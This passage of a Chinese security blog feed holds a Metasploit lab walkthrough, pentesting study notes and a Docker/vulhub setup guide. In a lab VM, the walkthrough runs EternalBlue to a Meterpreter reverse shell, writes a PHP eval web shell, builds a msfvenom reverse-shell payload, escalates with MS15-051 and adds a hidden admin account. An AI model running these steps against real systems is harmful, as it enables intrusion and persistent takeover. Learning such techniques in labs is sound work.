class="line">   NAMED_PIPES  /usr/share/metasploit-fram  yes       List of named pipes to check</span><br><span class="line">                ework/data/wordlists/named</span><br><span class="line">                _pipes.txt</span><br><span class="line">   RHOSTS                                   yes       The target host(s), see https://docs.metasplo</span><br><span class="line">                                                      it.com/docs/using-metasploit/basics/using-met</span><br><span class="line">                                                      asploit.html</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>yes的是需要设置的，no可以不用设置，有些事给你填好的</p><p>RHOST：目标地址（remote）</p><p>LHOST：本地地址</p><h3 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h3><p>端口扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; db_nmap -p 445 192.168.174.157</span><br><span class="line">[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 12:43 CST</span><br><span class="line">[*] Nmap: Nmap scan report for 192.168.174.157</span><br><span class="line">[*] Nmap: Host is up (0.00036s latency).</span><br><span class="line">[*] Nmap: PORT    STATE SERVICE</span><br><span class="line">[*] Nmap: 445/tcp open  microsoft-ds</span><br><span class="line">[*] Nmap: MAC Address: 00:0C:29:4E:42:2E (VMware)</span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.19 seconds</span><br></pre></td></tr></table></figure><p>漏洞扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOST 192.168.174.157</span><br><span class="line">RHOST =&gt; 192.168.174.157</span><br></pre></td></tr></table></figure><p>如果之前有用db_namp扫描过，可以直接从hosts中读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hosts -R</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>返回信息提示有可能存在漏洞</p><h3 id="攻击靶机"><a href="#攻击靶机" class="headerlink" title="攻击靶机"></a>攻击靶机</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">利用攻击模块</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/do</span><br><span class="line">                                             cs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authenticatio</span><br><span class="line">                                             n. Only affects Windows Server 2008 R2, Windows 7, Win</span><br><span class="line">                                             dows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. O</span><br><span class="line">                                             nly affects Windows Server 2008 R2, Windows 7, Windows</span><br><span class="line">                                              Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affect</span><br><span class="line">                                             s Windows Server 2008 R2, Windows 7, Windows Embedded</span><br><span class="line">                                             Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.174.137  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里用hosts设置试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---           ----          -------       ---------  -----  -------  ----  --------</span><br><span class="line">192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server</span><br><span class="line">.157         42:2E         TF1           er 2008 R2</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; hosts -R</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac           name          os_name       os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---           ----          -------       ---------  -----  -------  ----  --------</span><br><span class="line">192.168.174  00:0C:29:4E:  WIN-R4FJ4HCK  Windows Serv  Standard   SP1    server</span><br><span class="line">.157         42:2E         TF1           er 2008 R2</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 192.168.174.157</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.174.157  yes       The target host(s), see https://docs.metasploit.com/do</span><br><span class="line">                                             cs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="选择payload"><a href="#选择payload" class="headerlink" title="选择payload"></a>选择payload</h3><p>因为漏洞的利用有不同的目的，也有不同的方式，我们这里就要选择自己需要的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads</span><br><span class="line"></span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   #   Name                                                Disclosure Date  Rank    Check  Description</span><br><span class="line">   -   ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   0   payload/generic/custom                              .                normal  No     Custom Payload</span><br><span class="line">   1   payload/generic/shell_bind_aws_ssm                  .                normal  No     Command Shell, Bind SSM (via AWS API)</span><br><span class="line">   2   payload/generic/shell_bind_tcp                      .                normal  No     Generic Command Shell, Bind TCP Inline</span><br><span class="line">   3   payload/generic/shell_reverse_tcp                   .                normal  No     Generic Command Shell, Reverse TCP Inline</span><br></pre></td></tr></table></figure><p>这里我们用reverse的，也就是反弹shell，而bind是正向的，目标服务器可能不一定支持我们去连接他，所以我们需要让他主动来连接我们，于是选择反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.174.137:4444 </span><br><span class="line">[*] 192.168.174.157:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.174.157:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.174.157:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.174.157:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.174.157:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.174.157:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.174.157:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.174.157:445 - CORE raw buffer dump (51 bytes)</span><br><span class="line">[*] 192.168.174.157:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class="line">[*] 192.168.174.157:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard </span><br><span class="line">[*] 192.168.174.157:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac</span><br><span class="line">[*] 192.168.174.157:445 - 0x00000030  6b 20 31                                         k 1             </span><br><span class="line">[+] 192.168.174.157:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.174.157:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.174.157:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] Sending stage (201798 bytes) to 192.168.174.157</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.174.137:4444 -&gt; 192.168.174.157:49163) at 2024-05-21 12:50:03 +0800</span><br><span class="line">[-] 192.168.174.157:445 - RubySMB::Error::CommunicationError: RubySMB::Error::CommunicationError</span><br></pre></td></tr></table></figure><p>等待一会后，会进入后渗透模块meterpreter，可以使用getuid，来查看当前用户所属的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h2 id="实验环境二"><a href="#实验环境二" class="headerlink" title="实验环境二"></a>实验环境二</h2><p>创建低权限用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user qaq 123abc. /add</span><br><span class="line">net user 查看是否创建成功</span><br></pre></td></tr></table></figure><p>修改phpstudy进程的所有者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务-&gt;找到apache2进程-&gt;停止-&gt;属性-&gt;登录-&gt;此账户-&gt;浏览-&gt;找到qaq，输入密码应用即可</span><br></pre></td></tr></table></figure><p>但启动时会报错，因为阿帕奇的log文件夹会记录apache的信息，我们需要给这个文件赋予qaq写权限，然后重启相关服务即可，访问主页试试</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240521173640201.png" alt="image-20240521173640201"></p><p>进入phpmyadmin页面</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240521173736035.png" alt="image-20240521173736035"></p><h3 id="扫描靶机-1"><a href="#扫描靶机-1" class="headerlink" title="扫描靶机"></a>扫描靶机</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search phpmyadmin</span><br><span class="line">use 1</span><br><span class="line">options #要设置三个东西</span><br><span class="line">set rhost 192.168.174.1257</span><br><span class="line">set targeturi /phpMyAdmin-4.8.1/</span><br><span class="line">set userpass_file small.txt设置密码字典</span><br><span class="line">##用户名也可以设置字典爆破</span><br><span class="line">---------------------------------</span><br><span class="line">字典可以在文件中找</span><br><span class="line">locate small.txt</span><br><span class="line">cp path /root</span><br></pre></td></tr></table></figure><p>使用这个模块就算密码正确有时候也会失败，不好用，不如bp</p><h3 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search phpmyadmin</span><br><span class="line">use 8</span><br><span class="line">根据前面爆破出来的密码设置即可</span><br><span class="line">run</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: qaq</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer    : WIN-R4FJ4HCKTF1</span><br><span class="line">OS          : Windows NT WIN-R4FJ4HCKTF1 6.1 build 7601 (Windows Server 2008 R2 Standard Edition Service Pack 1) i586</span><br><span class="line">Meterpreter : php/windows</span><br><span class="line">meterpreter &gt; getwd</span><br><span class="line">C:\phpStudy\WWW\phpMyAdmin-4.8.1</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在线比对补丁查找exp：<a href="https://bugs.hacking8.com/tiquan/%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AA%E6%98%AF%E6%A0%B9%E6%8D%AEsysinfo%E7%9A%84%E4%BF%A1%E6%81%AF%E6%9F%A5%E6%89%BE%E7%9A%84%EF%BC%8C%E4%BD%86meterpreter%E6%B2%A1%E6%9C%89%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8D%A2%E4%B8%AA%E5%B7%A5%E5%85%B7">https://bugs.hacking8.com/tiquan/，因为这个是根据sysinfo的信息查找的，但meterpreter没有，需要换个工具</a></p><p>写木马,用antsword连</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit 1.php</span><br><span class="line">&lt;?php eval($_REQUEST[123]) ?&gt;</span><br><span class="line">meterpreter &gt; ls 1.php</span><br><span class="line">100666/rw-rw-rw-  128849018910  fil  233591561222-02-03 07:15:02 +0800  1.php</span><br></pre></td></tr></table></figure><p>验证一下，访问这个页面，传一个phpinfo（）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.157/phpMyAdmin-4.8.1/1.php?123=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240521210535033.png" alt="image-20240521210535033"></p><p>蚁🗡连接</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240521213257467.png" alt="image-20240521213257467"></p><p>进入命令界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240521213446704.png" alt="image-20240521213446704"></p><p>利用补丁号更具操作系统类型，查找exp，究竟哪一个有用，要我们一个一个去试</p><h3 id="MS15-051-KB3045171"><a href="#MS15-051-KB3045171" class="headerlink" title="MS15-051-KB3045171"></a>MS15-051-KB3045171</h3><p>在文件里右键上传即可</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240521213819003.png" alt="image-20240521213819003"></p><p>最好重命名一下，方便利用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc.exe whami</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240521214025522.png" alt="image-20240521214025522"></p><p>这时候就是系统权限的用户了，添加用户进入管理组,后续就可以利用这个用户进行渗透，也有一种隐藏用户，不容易被发现</p><p><a href="https://blog.csdn.net/weixin_40412037/article/details/123478562">https://blog.csdn.net/weixin_40412037/article/details/123478562</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc.exe net user a a.1 /add#添加用户</span><br><span class="line"></span><br><span class="line">net localgroup administrators a /add  #添加用户至管理组</span><br></pre></td></tr></table></figure><h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>上传一个属于meterpreter的木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先拿一个msf的session，另开一个</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.174.137 lport=1234 -f exe  &gt; shell.exe </span><br></pre></td></tr></table></figure><p>OS&#x2F;几位&#x2F;后渗透模块的反弹shell&#x2F;监听地址和端口，文件类型</p><p>进入meterpreter加载exe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload shell.exe</span><br><span class="line">[*] Uploading  : /root/shell.exe -&gt; shell.exe</span><br><span class="line">[*] Uploaded -1.00 B of 203.50 KiB (-0.0%): /root/shell.exe -&gt; shell.exe</span><br><span class="line">[*] Completed  : /root/shell.exe -&gt; shell.exe</span><br><span class="line">meterpreter &gt; ls shell.exe</span><br><span class="line">100777/rwxrwxrwx  895002465218048  fil  233592092020-04-06 21:40:02 +0800  shell.exe</span><br><span class="line">#rwx有可执行权限</span><br></pre></td></tr></table></figure><p>新开一个监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">#不用默认的payload，去复制木马的payload</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter_reverse_tcp</span><br><span class="line">#option设置一下</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.174.137</span><br><span class="line">LHOST =&gt; 192.168.174.137</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 1234</span><br><span class="line">LPORT =&gt; 1234</span><br></pre></td></tr></table></figure><p>meterpreter</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; execute -f shell.exe</span><br><span class="line">Process 1368 created.</span><br></pre></td></tr></table></figure><p>获得shell后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">[-] priv_passwd_get_sam_hashes: Operation failed: 1168</span><br></pre></td></tr></table></figure><p>这里报错是权限不够，而不是没有这个命令</p><h3 id="msf提权模块"><a href="#msf提权模块" class="headerlink" title="msf提权模块"></a>msf提权模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#use post/multi/recon/local_exploit_suggester</span><br><span class="line">#Msf里能够提权的模块还有很多如use exploit/windows/local/ms16_016_webdav （可能需要使用migrate迁移一下进程）</span><br><span class="line">#先把会话放在后台</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 16...</span><br><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">options</span><br><span class="line">设置下会话，可以用sessions命令查看</span><br></pre></td></tr></table></figure><p>这个会返回很多的可用payload，需要一个一个测试</p>]]></content>
      
      
      
        <tags>
            
            <tag> msf </tag>
            
            <tag> ms17_010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些读书笔记</title>
      <link href="/2024/05/19/%E4%B8%80%E4%BA%9B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/05/19/%E4%B8%80%E4%BA%9B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="读书笔记"><a href="#读书笔记" class="headerlink" title="读书笔记"></a>读书笔记</h1><p>主要是记录一些常识</p><h2 id="msf篇"><a href="#msf篇" class="headerlink" title="msf篇"></a>msf篇</h2><p><strong>渗透测试</strong>：是一种通过模拟恶意攻击者的技术与方法，挫败目标系统安全控制措施，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试与评估方式。</p><p>渗透测试的<strong>分类</strong>:黑盒和白盒、灰盒（白+黑）</p><p>一定的测试流程：</p><ol><li>安全测试方法学开源手册</li><li>NIST SP 800-42网络安全测试指南</li><li>OWASP top 10</li><li>Web安全威胁分类标准</li><li>PTES</li></ol><p>着重记一下PTES，认同度比较高</p><p><strong>七个阶段</strong>：前期交互、情报搜集、威胁建模（团队brain storm）、漏洞分析、渗透攻击、后渗透攻击、报告</p><p><strong>安全漏洞的生命周期</strong>：</p><pre><code>1. 研究与发掘1. exp开发与测试1. 漏洞和exp在封闭团队中流传1. 扩散开了1. 恶意程序出现开始传播1. 大规模传播并危害互联网1. 逐渐消亡</code></pre><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240519203316672.png" alt="image-20240519203316672"></p><p>​也就是我们说的0day，1day之类的</p><p><strong>0day：</strong>从发现到补丁，传播一段时间后就是1day了</p><p><strong>漏洞也有买卖、地下经济链，No more free bug</strong></p><p><strong>安全漏洞公共资源库</strong>：</p><ol><li>CNNVD 中国国家漏洞库</li><li>CNVD 中国国家信息安全漏洞共享平台</li><li>乌云（民间组织）</li><li>SCAP</li><li>CVE 通用漏洞与披露</li><li>NVD 国家漏洞数据库（美）</li><li>securityfocus</li><li>OSVDB msf作者发起的</li></ol><p><strong>渗透攻击的代码获取</strong></p><p>msf应该就是最好的了，但也有其它的，付费或者免费的都有1337day就是付费的</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240519203914970.png" alt="image-20240519203914970"></p><p><strong>好多插件：</strong></p><p>Nessus、OpenVAS、SET、FAast Track、Karmetasploit等</p><p>Nessus 是一款广泛使用的网络<a href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7&spm=1001.2101.3001.7020">漏洞扫描工具</a>。它由 Tenable Network Security 公司开发，旨在帮助组织评估其计算机系统和网络的安全性。</p><p>OpenVas是一款开源的漏洞扫描工具，是Nessus项目分支，检测目标网络或主机的安全性。现基于B&#x2F;S(浏览器&#x2F;服务器)架构进行工作，执行扫描并提供扫描结果。</p><p> Kali–social engineering toolkit（SET）<a href="https://blog.csdn.net/m0_68012373/article/details/125564443">https://blog.csdn.net/m0_68012373/article/details/125564443</a></p><p>Fast-Track是Backtrack工具里面自带的渗透工具，在现代的渗透测试过程中体现出了她所拥有的强大的威力，同时也对安全人员带来了很大的压力。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240519205417745.png" alt="image-20240519205417745">ss</p><p>基础库：RRex fw-core、fw-base</p><p>四个模块：aux、exp、payload、post、encoders</p><p>SCADA工业控制系统服务渗透攻击</p><p><strong>主动渗透攻击</strong>所利用的安全漏洞位于网络服务端软件与服务承载的上层应用程序之中，</p><p><strong>被动渗透攻击</strong>利用的安全漏洞位于客户端软件中，如浏览器、浏览器插件、电子邮件客户端、Office与Adobe等各种文档阅读与编辑软件。</p><p><strong>保护机制</strong>：Windows7等新型操作系统所引人的NX(堆栈不可执行)、DEP(数据执行保护)，可以通过控制payload绕过</p><p>空指令：在x86CPU体系架构平台上的操作码是 0x90.在渗透攻击构造邪恶数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行Shellcode 时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。Metasploit框架中的空指令模块就是用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。</p><p><strong>编码器模块</strong>的第一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的“坏字符”，这些“坏字符”的存在将导致特殊构造的邪恶数据缓冲区无法按照预期目标完成，典型的就是0x00</p><p>第二个就是免杀</p><h1 id="Linux之Xinetd服务介绍"><a href="#Linux之Xinetd服务介绍" class="headerlink" title="Linux之Xinetd服务介绍"></a><a href="https://blog.csdn.net/lzghxjt/article/details/83018710">Linux之Xinetd服务介绍</a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali+docker+vulhub</title>
      <link href="/2024/04/28/kali-docker-vulhub/"/>
      <url>/2024/04/28/kali-docker-vulhub/</url>
      
        <content type="html"><![CDATA[<h1 id="vulhub环境搭建"><a href="#vulhub环境搭建" class="headerlink" title="vulhub环境搭建"></a><a href="https://www.freebuf.com/vuls/282626.html">vulhub环境搭建</a></h1><h2 id="安装证书环境"><a href="#安装证书环境" class="headerlink" title="安装证书环境"></a>安装证书环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#记得配下源 编辑 /etc/apt/source.list</span></span><br><span class="line">apt-update</span><br><span class="line"><span class="comment">#安装https和ca证书</span></span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br><span class="line"><span class="comment">#dirmngr</span></span><br><span class="line">apt-get install dirmngr</span><br></pre></td></tr></table></figure><p>补充知s识<a href="https://docs.oracle.com/cd/E75432_01/html/E72378/dirmngr-8.html">dirmngr</a></p><h2 id="添加GPG密钥并添加更新源"><a href="#添加GPG密钥并添加更新源" class="headerlink" title="添加GPG密钥并添加更新源"></a>添加GPG密钥并添加更新源</h2><p>获取指定URL的GPG（GNU Privacy Guard）密钥，并使用<code>apt-key</code>命令将其添加到密钥环中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><ul><li><code>curl</code>：这是一个命令行工具，用于使用各种支持的协议从服务器传输数据。</li><li><code>-fsSL</code>:这些是传递给curl的命令的选项：<ul><li><code>-f</code>：它告诉<code>curl</code>在请求失败时静默失败，不生成任何输出。</li><li><code>-s</code>：它使<code>curl</code>以静默模式运行，不显示任何进度或错误消息。</li><li><code>-S</code>：如果发生错误，它强制<code>curl</code>显示错误消息。</li><li><code>-L</code>：它指示<code>curl</code>在服务器响应重定向时跟随重定向。</li></ul></li><li><code>https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg</code>：这是要获取的GPG密钥的URL。在这种情况下，它是清华大学镜像上托管的Docker CE（Community Edition）仓库的GPG密钥文件的URL。</li><li><code>sudo apt-key add -</code>：此命令将从<code>curl</code>接收到的GPG密钥添加到系统的密钥环中。末尾的<code>-</code>表示从标准输入读取GPG密钥。</li></ul><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240428234738195.png" alt="image-20240428234738195"></p><p>将指定的软件源行添加到<code>/etc/apt/sources.list.d/docker.list</code>文件中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure><p>让我们逐个解释命令及其组成部分：</p><ul><li><code>echo</code>: 这是一个命令，用于将参数中的文本内容输出到标准输出（终端）。</li><li><code>&#39;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#39;</code>: 这是要输出的文本内容，它是一个代表软件源的行。在这个例子中，它指定了一个名为”buster”的Debian发行版中的Docker CE软件源，使用的是清华大学镜像站提供的URL。</li><li><code>tee</code>: 这是一个命令，它接收标准输入并将其内容写入一个或多个文件中。</li><li><code>/etc/apt/sources.list.d/docker.list</code>: 这是要写入的文件路径，它位于<code>/etc/apt/sources.list.d/</code>目录下，用于存储软件源的配置文件。</li></ul><p>通过执行这个命令，您将使用<code>echo</code>命令输出指定的软件源行，然后通过管道将其传递给<code>sudo tee</code>命令。<code>tee</code>命令以<code>sudo</code>权限将输入的内容写入<code>/etc/apt/sources.list.d/docker.list</code>文件中，这样就添加了一个新的软件源配置。</p><h2 id="系统更新以及安装docker"><a href="#系统更新以及安装docker" class="headerlink" title="系统更新以及安装docker"></a>系统更新以及安装docker</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#因为更新了证书和源记得再更新一次</span></span><br><span class="line">apt-get update</span><br><span class="line"><span class="comment">#安装docker-ce</span></span><br><span class="line">apt install docker-ce</span><br></pre></td></tr></table></figure><h3 id="启动docker服务器"><a href="#启动docker服务器" class="headerlink" title="启动docker服务器"></a>启动docker服务器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h3 id="安装compose"><a href="#安装compose" class="headerlink" title="安装compose"></a>安装compose</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install docker-compose</span><br></pre></td></tr></table></figure><h3 id="docker安装测试"><a href="#docker安装测试" class="headerlink" title="docker安装测试"></a>docker安装测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version    <span class="comment">#查看docker的版本信息</span></span><br><span class="line">docker images   <span class="comment">#查看拥有的images</span></span><br><span class="line">docker ps    <span class="comment">#查看docker container</span></span><br></pre></td></tr></table></figure><h3 id="配置镜像加速aliyun"><a href="#配置镜像加速aliyun" class="headerlink" title="配置镜像加速aliyun"></a>配置镜像加速aliyun</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://xxx.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>在aliyun的容器镜像服务里找到镜像工具点进镜像加速器</p><p>到这里就结束了</p><h2 id="Docker安装sqli-labs"><a href="#Docker安装sqli-labs" class="headerlink" title="Docker安装sqli-labs"></a>Docker安装sqli-labs</h2><p>练习用docker安装sqli-labs</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search     sqli-labs  